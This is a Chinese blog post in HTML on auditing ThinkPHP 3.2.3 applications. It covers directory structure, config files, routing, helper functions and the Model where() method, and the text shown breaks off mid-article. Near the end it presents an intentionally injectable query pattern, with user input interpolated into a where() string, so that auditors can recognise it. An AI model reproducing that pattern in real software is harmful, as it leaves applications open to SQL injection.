

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
  <link rel="icon" href="/img/icon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="jelly">
  <meta name="keywords" content="">
  
  <title>总结 ThinkPHP3 代码审计方法 - jelly&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":"14de5c0cf6db6044f06b32ef50694a98","google":"G-1S553HH16G","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Jelly's blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/doll.webp') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="总结 ThinkPHP3 代码审计方法">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-09-10 14:23" pubdate>
        2021年9月10日 下午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      10.2k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      132
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">总结 ThinkPHP3 代码审计方法</h1>
            
              <p class="note note-info">
                
                  本文最后更新于：3 天前
                
              </p>
            
            <div class="markdown-body">
              <h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>ThinkPHP 是国内著名的 php开发框架，基于MVC模式，最早诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP</p>
<p>本文主要分析 ThinkPHP v3 的程序代码，通过对 TP3 代码结构分析、底层代码分析、经典历史漏洞复现分析等，学习如何审计 MVC 模式的程序代码，遇到使用 TP3 的代码能够独立审计。即使不想对 TP3 代码做过多了解的小伙伴通过本文也能对TP3程序的漏洞有个清晰的认识</p>
<p>ThinkPHP v3.x 系列最早发布于 2012 年，于 2018 年停止维护，其中使用最多的是在 2014 年发布的 3.2.3，本文审计代码也是这个版本。也许TP 3现在很少能见到了，但通过对TP 3的完整代码分析，能更好入门 MVC 程序的代码审计</p>
<h1 id="0x01了解ThinkPHP-3"><a href="#0x01了解ThinkPHP-3" class="headerlink" title="0x01了解ThinkPHP 3"></a>0x01了解ThinkPHP 3</h1><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>1）tp3程序根目录（默认也是web部署目录）</p>
<p>TP3的初始目录结构如下：</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs delphi">www  WEB部署目录（或者子目录）<br>├─<span class="hljs-keyword">index</span>.php       入口文件<br>├─README.md       README文件<br>├─Application     应用目录，Application目录默认是空的，但是第一次访问入口文件会自动生成<br>├─<span class="hljs-keyword">Public</span>          资源文件目录<br>└─ThinkPHP        框架目录<br></code></pre></td></tr></table></figure>

<blockquote>
<p>web根目录部署常见问题</p>
</blockquote>
<p>这个时期的 web 根目录部署上都有一个明显的问题，程序的所有文件都位于在 WEB 根目录目录下，这将导致程序的敏感文件也会可以通过 web 服务获取。如可以直接访问 Application/Runtime/Logs/ 下的日志文件，网上也有对应的通过爆破获取 tp3 程序中的日志文件</p>
<img src="img/ThinkPHP3/image-20210730105644942.png" srcset="/img/loading.gif" lazyload alt="image-20210730105644942" style="zoom: 33%;" />

<p>2）框架目录</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">├─ThinkPHP 框架系统目录（可以部署在非web目录下面）<br>│  ├─Common       核心公共函数目录<br>│  ├─Conf         核心配置目录 <br>│  ├─Lang         核心语言包目录<br>│  ├─Library      框架类库目录<br>│  │  ├─Think     核心Think类库包目录<br>│  │  ├─Behavior  行为类库目录<br>│  │  ├─Org       Org类库包目录<br>│  │  ├─Vendor    第三方类库目录<br>│  │  ├─<span class="hljs-operator"> ...      </span>更多类库目录<br>│  ├─Mode         框架应用模式目录<br>│  ├─Tpl          系统模板目录<br>│  ├─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LICENSE</span>.</span></span>txt  框架授权协议文件<br>│  ├─logo.png     框架LOGO文件<br>│  ├─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">README</span>.</span></span>txt   框架README文件<br>│  └─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ThinkPHP</span>.</span></span>php 框架入口文件<br></code></pre></td></tr></table></figure>

<p>3）应用目录</p>
<p>TP 3 采用模块化的设计架构，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Application      默认应用目录（可以设置）<br>├─Common         公共模块（不能直接访问）<br>├─Home           前台模块<br>├─Admin          后台模块<br>├─...            其他更多模块<br>├─Runtime        默认运行时目录（可以设置）<br></code></pre></td></tr></table></figure>

<p>每个模块是相对独立的，其目录结构如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">├─Module         模块目录<br>│  ├─Conf        配置文件目录<br>│  ├─Common      公共函数目录<br>│  ├─Controller  控制器目录<br>│  ├─Model       模型目录<br>│  ├─Logic       逻辑目录（可选）<br>│  ├─Service     Service目录（可选）<br>│  ... 更多分层目录可选<br>│  └─View        视图目录<br></code></pre></td></tr></table></figure>

<p>Common模块是一个特殊的模块，是应用的公共模块，访问所有的模块之前都会首先加载公共模块下面的配置文件（<code>Conf/config.php</code>）和公共函数文件（<code>Common/function.php</code>）</p>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>在 ThinkPHP 中，一般来说应用的配置文件是自动加载的，加载的顺序是：</p>
<p>惯例配置-&gt;应用配置-&gt;模式配置-&gt;调试配置-&gt;状态配置-&gt;模块配置-&gt;扩展配置-&gt;动态配置</p>
<blockquote>
<p>以上是配置文件的加载顺序，后面的配置会覆盖之前的同名配置</p>
</blockquote>
<ul>
<li>惯例配置</li>
</ul>
<p>惯例配置文件：<code>ThinkPHP/Conf/convention.php</code>。该文件一般不会修改</p>
<ul>
<li>应用配置</li>
</ul>
<p>应用配置文件也就是调用所有模块之前都会首先加载的<strong>公共配置文件</strong>，默认位于 <code>Application/Common/Conf/config.php</code></p>
<ul>
<li>模块配置</li>
</ul>
<p>每个模块会自动加载自己的配置文件，位于 <code>Application/当前模块名/Conf/config.php</code></p>
<hr>
<p>在获取到目标程序源码时翻一翻这些配置文件主要收获在于获取数据库的配置信息</p>
<p>另外也可以翻翻<strong>模型</strong>代码，可能会有意外收获，因为在TP 3中实例化模型的时候可以使用dns连接数据库</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">new</span> \Home\Model\NewModel(<span class="hljs-string">&#x27;blog&#x27;</span>,<span class="hljs-string">&#x27;think_&#x27;</span>,<span class="hljs-string">&#x27;mysql://root:1234@localhost/demo&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>另外一点需要注意的是，TP3中一个配置文件就可以实现很多信息的配置，如<strong>数据库配置信息</strong>，<strong>路由规则配</strong>置等都会放在一个文件中。在TP5中则是通过专门的文件去配置不同的需求，如路由配置文件专门负责配置路由，数据库配置文件专门负责配置数据库信息</p>
<h2 id="路由处理"><a href="#路由处理" class="headerlink" title="路由处理"></a>路由处理</h2><p>在 TP3 中默认路由处理方式如下：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>tp3.com<span class="hljs-regexp">/index.php/</span>Home<span class="hljs-regexp">/Index/i</span>ndex<span class="hljs-regexp">/id/</span><span class="hljs-number">1</span><br>              入口文件		模块<span class="hljs-regexp">/控制器/</span>方法/	参数<br></code></pre></td></tr></table></figure>

<p>还可以使用兼容模式</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?s=Home<span class="hljs-regexp">/Index/i</span>ndex<span class="hljs-regexp">/id/</span><span class="hljs-number">1</span><br>入口文件			模块<span class="hljs-regexp">/控制器/</span>方法/	参数<br></code></pre></td></tr></table></figure>

<hr>
<p>TP3 具有路由转发的功能，具体路由规则在<strong>应用配置文件，或者模块配置文件</strong>中，上面有提及这两个文件的位置</p>
<p>配置方式如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 开启路由</span><br><span class="hljs-string">&#x27;URL_ROUTER_ON&#x27;</span>   =&gt; <span class="hljs-literal">true</span>,<br><span class="hljs-comment">// 路由规则</span><br><span class="hljs-string">&#x27;URL_ROUTE_RULES&#x27;</span>	=&gt; <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;news/:year/:month/:day&#x27;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;News/archive&#x27;</span>, <span class="hljs-string">&#x27;status=1&#x27;</span>),<br>    <span class="hljs-string">&#x27;news/:id&#x27;</span>               =&gt; <span class="hljs-string">&#x27;News/read&#x27;</span>,<br>    <span class="hljs-string">&#x27;news/read/:id&#x27;</span>          =&gt; <span class="hljs-string">&#x27;/news/:1&#x27;</span>,<br>),<br></code></pre></td></tr></table></figure>

<p>如果路由规则位于应用配置文件，路由规则则作用于全局。如果路由规则位于模块配置文件，则只作用于当前模块，在访问对应路由时要加上模块名，如在home模块配置文件定义了如上的路由，访问方式为<code>http://test.com/home/news/1</code></p>
<h2 id="快捷方法"><a href="#快捷方法" class="headerlink" title="快捷方法"></a>快捷方法</h2><p>TP 3 对一些经常使用操作封装成了<strong>快捷方法</strong>，目的在于使程序更加简单安全。在TP 3官方文档中并没有做系统的介绍，不过在TP 5中就有系统整理，并且还给了一个规范命名：<strong>助手函数</strong></p>
<p>快捷方法来自 ThinkPHP/Common/functions.php，下面介绍几个</p>
<h3 id="I方法"><a href="#I方法" class="headerlink" title="I方法"></a>I方法</h3><p>PHP 程序一般使用 <code>$_GET, $_POST</code> 等全局变量获取外部数据， 在ThinkPHP封装了一个<strong>I方法</strong>可以更加方便和安全的获取外部变量，用法格式如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">I(<span class="hljs-string">&#x27;变量类型.变量名/修饰符&#x27;</span>,[<span class="hljs-string">&#x27;默认值&#x27;</span>],[<span class="hljs-string">&#x27;过滤方法或正则&#x27;</span>],[<span class="hljs-string">&#x27;额外数据源&#x27;</span>])<br></code></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> I(<span class="hljs-string">&#x27;get.id&#x27;</span>); <span class="hljs-comment">// 相当于 $_GET[&#x27;id&#x27;]</span><br><span class="hljs-keyword">echo</span> I(<span class="hljs-string">&#x27;get.name&#x27;</span>); <span class="hljs-comment">// 相当于 $_GET[&#x27;name&#x27;]</span><br><span class="hljs-keyword">echo</span> I(<span class="hljs-string">&#x27;get.name&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;htmlspecialchars&#x27;</span>); 	<span class="hljs-comment">// 采用htmlspecialchars方法对$_GET[&#x27;name&#x27;] 进行过滤，如果不存在则返回空字符串</span><br></code></pre></td></tr></table></figure>

<p>如果没有传入过滤的方法，系统会采用默认的过滤机制，这个可以在配置文件中获取</p>
<h3 id="C方法"><a href="#C方法" class="headerlink" title="C方法"></a>C方法</h3><p>读取配置文件里面的数据</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//	读取当前的URL模式配置参数</span><br><span class="hljs-variable">$model</span> = C(<span class="hljs-string">&#x27;URL_MODEL&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h3 id="M方法-D方法"><a href="#M方法-D方法" class="headerlink" title="M方法/D方法"></a>M方法/D方法</h3><p>用于数据模型的实例化操作，具体这两个方法怎么实现，有什么区别，暂时就不多关注了，只用知道通过这两个快捷方法能快速实例化一个数据模型对象，从而操作数据库</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//实例化模型</span><br><span class="hljs-comment">// 相当于 $User = new \Home\Model\UserModel();</span><br><span class="hljs-variable">$User</span> = D(<span class="hljs-string">&#x27;User&#x27;</span>);<br><span class="hljs-comment">// 和用法 $User = new \Think\Model(&#x27;User&#x27;); 等效</span><br><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&#x27;User&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>TP3 是基于 MVC 模式的架构，数据库和程序大部分逻辑都在<strong>模型M</strong>处处理。TP3 在<strong>模型M</strong>的底层设计上，出现了很多 sql 注入这样的问题，这里复现它的漏洞前，先熟悉一下底层的设计</p>
<h3 id="Think-Model类"><a href="#Think-Model类" class="headerlink" title="\Think\Model类"></a>\Think\Model类</h3><p>TP3 的<strong>模型基类</strong>为 <strong>\Think\Model类</strong>，在 <strong>ThinkPHP/Library/Think/Model.class.php</strong> 中被定义。该类实现了ActiveRecord模式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//	ThinkPHP/Library/Think/Model.class.php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Think</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span> </span>&#123;<br>  	<span class="hljs-comment">// 当前数据库操作对象</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$db</span>               =   <span class="hljs-literal">null</span>;<br>  	<span class="hljs-comment">// 数据表前缀，默认从获取配置文件中获取，默认配置为 think_</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tablePrefix</span>      =   <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">// 模型名称</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>             =   <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">// 数据库名称</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$dbName</span>           =   <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">// 数据库配置</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$connection</span>       =   <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">// 数据表名（不包含表前缀），一般情况下默认和模型名称相同</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tableName</span>        =   <span class="hljs-string">&#x27;&#x27;</span>;<br>  	<span class="hljs-comment">// 取得DB类的实例对象 字段检查</span><br>  	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$tablePrefix</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$connection</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>    		<span class="hljs-comment">// 建立数据库连接,数据库连接句柄最终保存在$this-&gt;db</span><br>        <span class="hljs-keyword">$this</span>-&gt;db(<span class="hljs-number">0</span>,<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;connection)?<span class="hljs-variable">$connection</span>:<span class="hljs-keyword">$this</span>-&gt;connection,<span class="hljs-literal">true</span>);<br>    &#125;<br>  ……<br></code></pre></td></tr></table></figure>

<h3 id="继承模型基类示例"><a href="#继承模型基类示例" class="headerlink" title="继承模型基类示例"></a>继承模型基类示例</h3><p>生成 Application/Home/Model/UserModel.class.php ，定义了一个 UserModel 模型类继承了模型基类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Home</span>\<span class="hljs-title">Model</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Model</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserModel</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span> </span>&#123;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="模型实例化"><a href="#模型实例化" class="headerlink" title="模型实例化"></a>模型实例化</h3><p>模型实例化有以下几种方法：</p>
<p>1）首先通过类名可以直接实例化</p>
<p>实例化上面定义的 UserModel 类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span> = <span class="hljs-keyword">new</span> \Home\Model\UserModel();<br></code></pre></td></tr></table></figure>

<p>2）另外 ThinkPHP 还提供了快捷方法，用于实例化模型：<strong>D方法</strong>和<strong>M方法</strong></p>
<p>D 方法用于实例化具体的模型类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//实例化模型</span><br><span class="hljs-variable">$User</span> = D(<span class="hljs-string">&#x27;User&#x27;</span>);<br><span class="hljs-comment">// 相当于 $User = new \Home\Model\UserModel();</span><br><span class="hljs-comment">// 执行具体的数据操作</span><br><span class="hljs-variable">$User</span>-&gt;select();<br></code></pre></td></tr></table></figure>

<p>M 方法不会加载具体的类，而是直接实例化利用模型基类，只定义一个名字，这样就能指定对应的表名，性能会高一点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 使用M方法实例化</span><br><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&#x27;User&#x27;</span>);<br><span class="hljs-comment">// 和用法 $User = new \Think\Model(&#x27;User&#x27;); 等效</span><br><span class="hljs-comment">// 执行其他的数据操作</span><br><span class="hljs-variable">$User</span>-&gt;select();<br></code></pre></td></tr></table></figure>

<p>3）实例化空模型类</p>
<p>使用原生SQL查询的话，不需要使用额外的模型类，实例化一个空模型类即可进行操作了，例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//实例化空模型</span><br><span class="hljs-variable">$Model</span> = <span class="hljs-keyword">new</span> Model();<br><span class="hljs-comment">//或者使用M快捷方法是等效的</span><br><span class="hljs-variable">$Model</span> = M();<br><span class="hljs-comment">//进行原生的SQL查询</span><br><span class="hljs-variable">$Model</span>-&gt;query(<span class="hljs-string">&#x27;SELECT * FROM think_user WHERE status = 1&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h3 id="模型基类的数据库操作"><a href="#模型基类的数据库操作" class="headerlink" title="模型基类的数据库操作"></a>模型基类的数据库操作</h3><p>TP3 <strong>模型基础类Model类</strong> 提供了很多操作数据库的方法，下面看一下一些常用方法：</p>
<ul>
<li>where()</li>
</ul>
<p>决定 where 字段的构造</p>
<p>where方法的参数支持字符串和数组，主要用于获取sql语句的where部分</p>
<p>1）参数为数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;User&quot;</span>); 				<span class="hljs-comment">// 实例化User对象</span><br><span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;field(<span class="hljs-string">&#x27;username,age&#x27;</span>)-&gt;where(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;select();<br></code></pre></td></tr></table></figure>

<p>最后执行的SQL语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `username`,`age` <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;wang&#x27;</span><br></code></pre></td></tr></table></figure>

<p>2）参数为字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;User&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br><span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;field(<span class="hljs-string">&#x27;username,age&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;username=&#x27;%s&#x27;&quot;</span>,<span class="hljs-variable">$name</span>)-&gt;select();<br></code></pre></td></tr></table></figure>

<p>最后执行的sql语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `username`,`age` <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">WHERE</span> ( username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;wang&#x27;</span> )<br></code></pre></td></tr></table></figure>

<p>3）<strong>存在漏洞的用法</strong></p>
<p>然后我就发现一种存在漏洞的写法，通过双引号包裹参数变量自动解析，这样传入的参数不会被过滤，通过闭合单引号和括号就能造成sql注入，即使这里使用 <strong>I方法</strong> 过滤也无效，从而造成sql注入，在代码审计时可以注意下程序中是否存在这个情况</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;User&quot;</span>); 					<span class="hljs-comment">// 实例化User对象</span><br><span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br><span class="hljs-variable">$User</span>-&gt;field(<span class="hljs-string">&#x27;username,age&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;username=&#x27;<span class="hljs-subst">$name</span>&#x27;&quot;</span>)-&gt;select();<br></code></pre></td></tr></table></figure>

<p>实际sql语句</p>
